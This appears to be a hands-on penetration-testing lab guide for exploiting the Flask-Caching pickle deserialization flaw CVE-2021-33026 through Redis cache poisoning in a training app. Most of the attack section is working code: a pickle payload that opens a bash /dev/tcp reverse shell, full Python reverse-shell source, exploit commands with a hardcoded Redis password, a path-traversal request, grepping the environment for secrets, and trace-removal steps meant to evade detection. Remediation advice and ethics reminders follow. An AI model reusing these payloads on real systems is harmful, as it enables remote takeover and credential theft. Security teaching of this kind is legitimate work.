# Lab 06 - Redis Cache Poisoning and Reverse Shell Exploitation

## Objective

Exploit the Flask-Caching CVE-2021-33026 vulnerability by:
1. Testing Redis connectivity on port 6379
2. Authenticating with discovered credentials
3. Testing cache poisoning with benign commands
4. Uploading a reverse shell script via ZIP file
5. Poisoning the Redis cache with malicious pickle payload
6. Setting up netcat listener on port 4444
7. Triggering exploitation to achieve Remote Code Execution
8. Gaining reverse shell access to the container

## ‚ö†Ô∏è WARNING

This lab involves actual exploitation techniques that achieve Remote Code Execution. **Only perform these actions on systems you own or have explicit written permission to test.** Unauthorized access to computer systems is illegal.

## Background

### CVE-2021-33026: Flask-Caching Pickle Deserialization RCE

Flask-Caching versions through 1.10.1 use Python's `pickle` module for serializing cached objects. The `pickle` module is inherently unsafe when handling untrusted data because it can execute arbitrary code during deserialization.

**Attack Flow:**
1. **Identify cached endpoint**: Find an endpoint that stores/retrieves cached data
2. **Craft malicious pickle**: Create a pickle payload that executes our reverse shell
3. **Poison the cache**: Inject malicious pickle into Redis using direct connection
4. **Trigger deserialization**: Access the cached endpoint via HTTP
5. **Code execution**: The application unpickles our payload, executing our code
6. **Reverse shell**: Connection established to our netcat listener

### Why This Works

When Python unpickles data, special methods like `__reduce__()` can specify arbitrary callables to execute:

```python
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"',))
```

When this object is pickled and then unpickled, it executes the `os.system()` command with our reverse shell payload.

## Prerequisites

- Completed Labs 01-05
- Redis credentials obtained from Lab 04
- Understanding of Redis and Python pickle
- `redis-cli` (optional but helpful)
- `netcat` (`nc`) installed
- Your local IP address (for reverse shell callback)

### Install Redis CLI (Optional)

**macOS:**
```bash
brew install redis
```

**Linux:**
```bash
sudo apt-get install redis-tools
```

**Windows:**
Follow this link: https://redis.io/docs/latest/operate/oss_and_stack/install/install-stack/windows/


## Steps

### Phase 1: Redis Connectivity Testing

### 1. Test Redis Port Accessibility

First, verify that Redis port 6379 is accessible:

```bash
# Test if port 6379 is open
nc -zv localhost 6379

# Expected output:
# Connection to localhost port 6379 [tcp/*] succeeded!
```

If the port is open, Redis is accessible from your host machine.

### 2. Connect to Redis and Authenticate

Connect to Redis using the password you discovered in Lab 04:

```bash
# Method 1: Using redis-cli (if installed)
redis-cli -h localhost -p 6379

# Once connected, authenticate
AUTH hCQr7gvbyRRN79Ugvc9Lssq6

# Test connection
PING
```

**Expected responses:**
```
127.0.0.1:6379> AUTH hCQr7gvbyRRN79Ugvc9Lssq6
OK
127.0.0.1:6379> PING
PONG
```

### 3. Explore Existing Cache Data

Without disrupting the application, examine what's cached (substitue your session ID):


Use the session ID that we were given in the last lab, to use in the exploit:
*if you need another one you can just run this again*
```bash
curl -I http://127.0.0.1:8080
```
output:
```
Set-Cookie: session_id=8190b18e-dbbe-40bd-a011-d3f067c98174; Expires=Sat, 11 Oct 2025 02:54:45 GMT; Max-Age=3600; Path=/
```
If this case our session id is 8190b18e-dbbe-40bd-a011-d3f067c98174, but use your own!

In the Redis CLI session explore the stored cache
```bash
# List all keys
KEYS *

# Example output:
#1) "flask_cache_session:76e8116f-3605-4865-939d-dbe191820f9f"
#2) "flask_cache_session:a9c3e604-1f7a-4380-af23-c4a7f18d3ba1"

# Examine a key's type
TYPE flask_cache_session:YOUR_SESSION_ID_GOES_HERE

# Get value (may be binary/pickled data)
GET flask_cache_session:YOUR_SESSION_ID_GOES_HERE

# Check key expiration
TTL flask_cache_session:YOUR_SESSION_ID_GOES_HERE
```

**Document the cache key format:**
```bash
# Note the pattern - typically:
# flask_cache_<endpoint>_<identifier>
# or
# cache:<function_name>:<args>
```

### Phase 2: Test Benign Cache Poisoning

Before deploying our reverse shell, test that cache poisoning works without disrupting the application. *This is important to stay hidden from potential endpoint detection software*

To do this we are going to remove our resume in the /resumes directory

### 4. Run non-disruptive RCE

To poison our redis cache database can use our redis_exploit.py file in the lab-files directory; but before running this python file we need to install a few packages.

```bash
pip install pyfiglet pymemcache redis
```

The file takes many arguements:
```bash
python redis_exploit.py -h
usage: redis_exploit.py [-h] --rhost RHOST [--rport RPORT]
                        --rpasswd RPASSWD --cacheType CACHETYPE
                        --cmd CMD --id ID

options:
  -h, --help            show this help message and exit
  --rhost RHOST         Target Machine Ip Address
  --rport RPORT         Python Flask App Port
  --rpasswd RPASSWD     Redis Server Password
  --cacheType CACHETYPE
                        Cache server type
  --cmd CMD             Command to get executed on the target
                        machine
  --id ID               Your ACTUAL SESSION COOKIE from the
                        VULNERABLE FLASK Application. Example: "se
                        ssion:3e8234e1-6c89-4ac2-be53-
                        20574edcbcaa"
```




With this info we can now poison the cache with our python file:
```bash
python redis_exploit.py --rhost localhost --rpasswd hCQr7gvbyRRN79Ugvc9Lssq6 --rport 6379 --cacheType redis --cmd "echo 'hello world'" --id YOUR_SESSION_ID_GOES_HERE
```

### 5. Test Deserialization

To test if the payload executes, you'd need to trigger the cache retrieval. To do this just navigate to a saved session ID from your client, and it will trigger the payload when unpickling 

```bash
curl --cookie "session_id=YOUR_SESSION_ID_GOES_HERE" http://127.0.0.1:8080
```

*I prefer to do this in my browser, as long as you are using the same session in your browser cache*

You should now see the resume (my_resume.pdf) is gone from our app!

Cache Poisoning and Remote Code Execution works!


### 6. Upload Reverse Shell
Now let's upload a reverse shell script that we can execute via cache poisoning.
Using the web app navigate to http://127.0.0.1:8080/resumes, and upload the evil_resumes.zip

This contains the normal my_resume.pdf, as well as a reverse shell file written in python, that connects to a command and control server on port 4444.


If you are curious, here is the python source code for the reverse shell 
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#public internet IP of attacker machine
#s.connect(("127.0.0.1",4444))
#docker for mac host.docker.internal
s.connect(("host.docker.internal", 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("sh")
```

### 7. Verify Reverse Shell File is Accessible

Check if the reverse shell was extracted and is accessible:

```bash
# Try to access the reverse shell script
curl http://localhost:8080/static../resumes/reverse_shell.py

# You should see the Python code
# If you see it, the file is accessible and ready to execute
```

**If you can see the reverse_shell.py content, you're ready for exploitation!**


### 8. Create Malicious Pickle Payload

Now the actual exploit payload that executes our reverse shell is very simple, since we are just calling a python file



### 9. Start Netcat Listener

In a **new terminal window**, start your netcat listener:

```bash
# Terminal 1: Start listener on port 4444
nc -lvnp 4444

# Expected output:
# Listening on 0.0.0.0 4444
```

**Keep this terminal open** - your reverse shell will connect here.


### Phase 4: Cache Poisoning for RCE


### 10. Poison our cache again with our RCE

With this info we can now poison the cache with our python file:
```bash
python redis_exploit.py --rhost localhost --rpasswd hCQr7gvbyRRN79Ugvc9Lssq6 --rport 6379 --cacheType redis --cmd "python resumes/reverse_shell.py" --id YOUR_SESSION_ID_GOES_HERE
```

### Phase 5: Exploitation


### 11. Trigger the Exploit

Now trigger the cache deserialization by accessing a cached endpoint.
```bash
curl --cookie "session_id=YOUR_SESSION_ID_GOES_HERE" http://127.0.0.1:8080
```
*I prefer to do this in my browser, as long as you are using the same session in your browser cache*


### 12. Receive Reverse Shell

**Check Terminal 1** (your netcat listener). If exploitation succeeded, you should see a termial # telling you can input commands:

```
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 46304
#
```

**YOU HAVE A SHELL!** üéâ

### Phase 6: Post-Exploitation

### 19. Enumerate the Container

Now explore the compromised system:

```bash
# Check who you are
whoami
id

# Check hostname
hostname

# Check OS
cat /etc/os-release
uname -a

# Check current directory
pwd
ls -la

# Check environment variables
env | grep -i password
env | grep -i redis
env | grep -i secret

```


### Phase 7: Cleanup

### 13. Clean Up Malicious Artifacts (Optional)

To avoid leaving obvious traces:

```bash
# In the reverse shell, remove the uploaded reverse shell
rm /resumes/reverse_shell.py

# Exit the shell
exit
```

```bash
# In redis-cli, remove malicious cache entry
redis-cli -h localhost -p 6379
AUTH your_password
DEL flask_cache_session:YOUR_SESSION_ID_GOES_HERE
exit
```

### 14. Document Your Findings


## Impact Assessment

### Confidentiality: HIGH
- Complete source code disclosed
- All credentials exposed
- Potential access to user data (resumes)

### Integrity: HIGH
- Ability to modify cached data
- Ability to upload arbitrary files
- Full control over application container

### Availability: HIGH
- Could delete cached data disrupting service
- Could modify application code
- Could terminate application processes

## Remediation Recommendations

### Immediate (Critical)

1. **Fix Nginx Configuration**
   ```nginx
   location /static/ {
       alias /app/static/;
   }
   ```

2. **Upgrade Flask-Caching**
   ```bash
   pip install Flask-Caching>=2.3.1
   ```
   or better yer, don't use a caching technique that involved python pickling 

3. **Restrict Redis Access**
   - Remove port exposure from docker-compose.yml
   - Use internal Docker networking only

4. **Implement File Upload Validation**
   - Whitelist allowed file extensions
   - Scan uploaded files
   - Isolate upload directory

### Short-term (High Priority)

5. **Use Environment Variables for Secrets**
   - Move all credentials to .env file
   - Never commit secrets to source code

6. **Implement Security Headers**
   
   Security headers protect against common web attacks by instructing browsers how to handle your content:

   **X-Frame-Options**: Prevents clickjacking attacks
   ```nginx
   # In nginx.conf, add to server block:
   add_header X-Frame-Options "SAMEORIGIN" always;
   ```
   - `DENY`: Page cannot be displayed in a frame/iframe
   - `SAMEORIGIN`: Page can only be framed by same origin
   - Prevents attackers from embedding your site in malicious iframes

   **Content-Security-Policy (CSP)**: Controls what resources the browser can load
   ```nginx
   add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;" always;
   ```
   - `default-src 'self'`: Only load resources from your domain
   - `script-src 'self'`: Only execute JavaScript from your domain (prevents XSS)
   - `style-src 'self' 'unsafe-inline'`: Allows inline styles (adjust as needed)
   - Helps prevent Cross-Site Scripting (XSS) attacks

   **HTTP Strict Transport Security (HSTS)**: Forces HTTPS connections
   ```nginx
   add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
   ```
   - `max-age=31536000`: Browser remembers to use HTTPS for 1 year
   - `includeSubDomains`: Applies to all subdomains too
   - Prevents protocol downgrade attacks and cookie hijacking

   ```

7. **Input Validation**
   - Sanitize all user inputs
   - Validate cache keys

8. **Access Controls**
   - Implement proper authentication
   - Add authorization checks

### Long-term (Best Practices)

9. **Security Audit**
   - Regular penetration testing
   - Code security reviews

10. **Dependency Management**
    - Automated vulnerability scanning (pip-audit in CI/CD)
    - Keep all dependencies updated

11. **Container Security**
    - Run containers as non-root user
    - Implement least privilege principles
    - Use read-only file systems where possible

12. **Monitoring & Detection**
    - Log suspicious activities
    - Monitor Redis access patterns
    - Alert on cache anomalies


## Conclusion
The ResumeCrunch application had multiple critical vulnerabilities that, when chained together, allowed for complete system compromise. All identified issues should be remediated immediately to prevent real-world exploitation.


## Learning Outcomes

By completing this lab, you have learned:

### Technical Skills
- Redis direct access and manipulation
- Python pickle deserialization exploitation
- Crafting malicious pickle payloads
- Cache poisoning techniques
- Reverse shell deployment methods
- Post-exploitation enumeration
- Multi-stage attack chain execution

### Security Concepts
- Insecure deserialization vulnerabilities
- Cache poisoning attack vectors
- Defense evasion techniques
- Responsible exploitation practices
- Impact of chained vulnerabilities
- Container security weaknesses

### Best Practices
- Thorough reconnaissance before exploitation
- Testing with benign payloads first
- Minimizing disruption to production systems
- Cleaning up after testing
- Comprehensive documentation
- Ethical hacking principles

## Key Takeaways

1. **Defense in Depth**: Multiple vulnerabilities chained together led to RCE
2. **Insecure Deserialization**: Never unpickle untrusted data
3. **Exposed Services**: Redis should never be exposed to untrusted networks
4. **Configuration Matters**: Small misconfigurations (Nginx trailing slash) have big impacts
5. **Dependency Management**: Keep libraries updated to patch known CVEs
6. **Credential Protection**: Never hardcode credentials in source code

---

## ‚ö†Ô∏è Legal and Ethical Reminder

The techniques demonstrated in this lab are for **educational purposes only**. You must:

- ‚úÖ Only test systems you own
- ‚úÖ Only test with explicit written permission
- ‚úÖ Follow responsible disclosure for real vulnerabilities
- ‚úÖ Respect data privacy and confidentiality
- ‚úÖ Use knowledge to improve security, not cause harm

- ‚ùå Never test production systems without authorization
- ‚ùå Never access others' data without permission
- ‚ùå Never disrupt services or destroy data
- ‚ùå Never use these techniques for malicious purposes

---

[‚Üê Previous: Vulnerability Analysis](lab-05-test-vulns.md) | [Back to Lab Overview](lab-overview.md)
print(base64.b64encode(payload).decode())
```
